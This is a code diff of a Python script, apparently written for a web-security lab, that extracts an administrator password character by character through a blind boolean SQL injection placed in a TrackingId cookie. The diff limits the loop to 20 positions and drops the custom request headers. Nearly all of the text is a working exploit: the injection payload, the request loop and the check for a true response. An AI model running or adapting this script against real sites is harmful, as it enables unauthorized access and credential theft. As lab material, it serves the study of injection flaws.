@@ -56,7 +56,7 @@ def passwdretrieval():
     position = 1
     urllib3.disable_warnings()
     (print("Retrieving administrator password..."))
-    while True:
+    while position <=20:                                # UPDATE - Adjust the postion length as needed. Password could be 32 chars for example.
         found_char = False
         for char in string.printable:
             url = f"https://{labid}.{targetdomain}:443/"
@@ -64,8 +64,8 @@ def passwdretrieval():
             payload = f"'+AND+(CASE+WHEN+(SUBSTRING((SELECT+password+FROM+Users+WHERE+username='administrator'),{position},1)='{char}')+THEN+1+ELSE+0+END)=1--"
             
             cookies = {"TrackingId": f"{trackingid}{payload}"}
-            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers"}
-            x = session.get(url, headers=headers, cookies=cookies, proxies=proxies, verify=False)
+            #headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers"}
+            x = session.get(url, cookies=cookies, proxies=proxies, verify=False)
             if f"{truetxt}" in x.text:
                 adminpassword += char
                 print(f"[+] Identified a character {char} at position {position}.")
